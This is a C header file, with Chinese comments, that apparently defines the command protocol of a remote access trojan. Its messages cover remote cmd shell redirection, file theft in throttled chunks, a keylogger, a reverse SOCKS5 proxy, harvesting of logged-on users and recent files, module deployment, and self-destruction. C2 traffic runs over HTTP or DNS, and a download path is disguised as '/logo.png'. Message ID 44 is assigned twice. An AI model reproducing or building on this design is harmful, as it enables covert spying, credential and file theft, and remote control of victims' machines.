#pragma once

#define MSGID UINT64
#define MSGSERIALID UINT64
#define INVALID_MSGSERIALID 0

#define INVALID_MSGID MAXUINT64

#define DOWNLOAD_SERVANT_CMD	TEXT("/logo.png")

#define MSGIDBASE 0LL

#define MSGID_PULL_COMMAND							(MSGIDBASE + 1LL)
//desc: 拉取控制命令

#define MSGID_NO_COMMAND							(MSGIDBASE + 2LL)
//desc: 服务端表示没有最新的命令

#define MSGID_REPLY_COMMAND							(MSGIDBASE + 3LL)
//desc: 客户端应答服务器的消息号

#define MSGID_LIST_MOD								(MSGIDBASE + 4LL)
//desc: 列取已经加载的模块
//ret:
//	mods	str		模块名称

#define MSGID_SET_DEFAULT_COMMNAME					(MSGIDBASE + 5LL)
//desc: 设置默认的通信方式
//param:
//	commname	str	(可选)http,dns
//ret:
//	commname	str	当前的默认通信方式

#define MSGID_DOWNLOAD_FILE							(MSGIDBASE + 6LL)
//desc: 客户端从消息中获取文件内容
//param:
//	localfile	str	服务端文件
//	targetfile	str	客户端文件

//#define MSGID_FILE_EXISTS							(MSGIDBASE + 7LL)
//desc: 客户端判断某个文件或目录是否存在
//param:
//	filepath	str	文件绝对路径
//ret:
//	exists		uint64	bool是否存在
//	isdir		uint64	bool是否是目录

#define MSGID_LIST_FILES							(MSGIDBASE + 8LL)
//desc: 客户端列取某个文件目录
//param:
//	findstr		str	查找字符串
//ret:
//	result		str	目录内容	filename(str)|attr(dword)|filesize(uint64)|lastWriteTime(uint64 filetime):

//#define MSGID_MOVE_FILE								(MSGIDBASE + 9LL)
//desc: 客户端移动文件
//param:
//	src			str	原文件
//	dest		str	目标文件 
//ret:
//	result		uint64	bool是否成功

//#define MSGID_COPY_FILE								(MSGIDBASE + 10LL)
//desc: 客户端复制文件
//param:
//	src			str	原文件
//	dest		str	目标文件
//ret:
//	result		uint64	bool是否成功

//#define MSGID_DELETE_FILE							(MSGIDBASE + 11LL)
//desc: 客户端删除文件
//param:
//	dest		str	目标文件
//ret:
//	result		uint64	bool是否成功

#define MSGID_DISKS									(MSGIDBASE + 12LL)
//desc: 列取客户端的磁盘分区
//param:
//ret:
//	result		str	分区内容 partition(str)|drivertype(uint)|totalbytes(uint64)|freebytes(uint64):

//#define MSGID_EXECUTE_CMDLINE						(MSGIDBASE + 13LL)
//desc: 执行客户端的程序
//param:
//	cmdline		str	命令行
//ret:
//	result		str	执行结果

#define MSGID_REQUEST_REPORT_INFO					(MSGIDBASE + 14LL)
//desc: 客户端上报基本信息
//param:
//	cn			str	主机名
//	ip			str	用逗号分隔的本机IP列表
//	instime		uint64	本机安装时间
//	os			uint64	操作系统版本
//	x64			uint64	是否x64平台
//	mods		str 用逗号分隔的本机模块名称列表

//#define MSGID_REDIRECT_EXEC							(MSGIDBASE + 15LL)
//desc: 在客户端上执行程序，并进行输入输出重定向
//param:
//	cmd			str	命令行
//ret:
//	pid			uint64	进程pid。如果是0，则表示失败

//#define MSGID_REDIRECT_INPUT						(MSGIDBASE + 16LL)
//desc: 向客户端的进程进行输入
//param:
//	pid			uint64	进程pid
//	in			str		输入数据
//ret:
//	active		uint64	进程是否还存在
//	out			str		进程的输出

//#define MSGID_REDIRECT_CLOSE						(MSGIDBASE + 17LL)
//desc: 结束客户端的重定向进程
//param:
//	pid			uint64	进程pid






#define MSGID_CMDREDIRECT_OPEN						(MSGIDBASE + 18LL)
//desc: Server要求客户端打开cmd进程
//ret:
//	result		uint64	TRUE/FALSE

#define MSGID_CMDREDIRECT_INPUT						(MSGIDBASE + 19LL)
//desc: 服务端向客户端的cmd进行输入
//param:
//	input		str		输入
//	rn			uint64	是否在后面补上\r\n
//ret:
//	result		uint64	TRUE/FALSE

#define MSGID_CMDREDIRECT_OUTPUT					(MSGIDBASE + 20LL)
//desc: 客户端向server返回cmd的输出
//param:
//	bytedata 输出

#define MSGID_CMDREDIRECT_CLOSE						(MSGIDBASE + 21LL)
//desc: 结束客户端的cmd重定向进程
//param:
//	result		uint64	TRUE/FALSE

#define MSGID_UPLOAD_FILE							(MSGIDBASE + 22LL)
//desc: 客户端将指定的文件放在消息中进行上传
//param:
//	remotefile	str	客户端的文件


#define MSGID_AVAILABLE_COMM						(MSGIDBASE + 23LL)
//desc: 客户端通过此消息来探测信道是否可用，客户端发送，服务器回应
//param:
//	commname	uint64
//ret:
//	commname	uint64

#define MSGID_SET_FILESERVER_LIST					(MSGIDBASE + 24LL)
//desc: 设置客户端的文件服务器列表
//param:
//	url			str		http://192.168.0.250/file.php,http://192.168.0.251/file.php

#define MSGID_COLLECT_FILE							(MSGIDBASE + 25LL)
//desc: 服务端要求客户端进行文件收集
//param:
//	filepath		str		c:\windows\calc.exe
//	blockcount		uint64	每一块的大小,64k的倍数值
//	intervaltime	uint64	数据块发送间隔时间(毫秒)
//ret:
//	fileid		str		文件id

//#define MSGID_COLLECT_FILE_BODY						(MSGIDBASE + 26LL)
//desc: 服务端要求客户端收集部分文件
//param:
//	fileid		str		
//	filepath	str
//	offset		uint64
//	size		uint64

#define MSGID_QUERY_COLLECTING_FILE					(MSGIDBASE + 27LL)
//desc: 服务端查询客户端正在进行的文件传输任务
//param:
//ret:
//	filepathlist	str		c:\windows\calc.exe,c:\windows\	

#define MSGID_ABORT_COLLECT_FILE					(MSGIDBASE + 28LL)
//desc: 取消正在进行的文件传输
//param:
//	fileid		str	

#define MSGID_INSTALL_MODULE						(MSGIDBASE + 29LL)
//desc: 服务端向客户端部署功能模块
//param:
//	modname		str			模块文件名称



#define MSGID_QUERY_START_SOCKS5				(MSGIDBASE + 30LL)
//desc: 打开远程客户端socks5代理
//param:
//reverseip str
//password str
//username str
//port uint64

#define MSGID_QUERY_STOP_SOCKS5				(MSGIDBASE + 31LL)
//desc: 关闭远程客户端socks5代理
//param:

#define MSGID_SELF_DESTRUCTION					(MSGIDBASE + 32LL)
//desc: 服务端向客户端发送指令,进行自毁
//param:

#define MSGID_QUERY_START_KEYLOGGER			(MSGIDBASE + 33LL)
//desc: 打开远程客户端键盘记录
//param:
//logpath str		保存路径
//maxsize uint64	保存的文件最大大小,单位字节

#define MSGID_QUERY_STOP_KEYLOGGER			(MSGIDBASE + 34LL)
//desc: 关闭远程客户端键盘记录
//param:

#define MSGID_MAKE_CLIENT_UPLOAD_PROGRESS	(MSGIDBASE + 35LL)
//desc: 客户端通知服务端文件, 文件传输的进度
//param:
//	msgserial uint64	消息序列号
//	cpserial uint64		CP协议的传输序列号
//	totalsize uint64	文件总大小

#define MSGID_QUERY_LOGON_USERS				(MSGIDBASE + 36LL)
//desc: 服务端查询客户端当前登录用户名
//param:
//ret:
//	result	str		true/false
//	users	str		逗号分隔的用户会话信息 username|sessionid|state|stationname,

#define MSGID_QUERY_MRU_FILE				(MSGIDBASE + 37LL)
//desc: 服务端查询客户端最近访问文件信息
//param:
//	aftertime	uint64	获取在这个时间之后的数据
//	checkexists	uint64	是否检查文件是否存在
//ret:
//	result	str		数据:"文件路径?文件状态(0-未知,1-存在,2-不存在)?最后修改时间",例如: c:\a.txt?0?1231211|d:\b.doc?1?1232122
#define MSGID_UNINSTALL_MODULE						(MSGIDBASE + 38LL)
//desc: 服务端向客户端部署功能模块
//param:
//	modname		str			模块文件名称
#define MSGID_DELETE_SERIALID						(MSGIDBASE + 39LL)

#define MSGID_GET_FILE						(MSGIDBASE + 40LL)

#define MSGID_PUT_FILE						(MSGIDBASE + 41LL)

#define MSGID_REQUESTPUT_FILE				(MSGIDBASE + 42LL)

#define MSGID_DELETE_FILE						(MSGIDBASE + 43LL)

#define MSGID_RUN_FILE				(MSGIDBASE + 44LL)

#define MSGID_OUTPUT_ERROR						(MSGIDBASE + 44LL)

#define MSGID_HTTPDOWN_FILE						(MSGIDBASE + 45LL)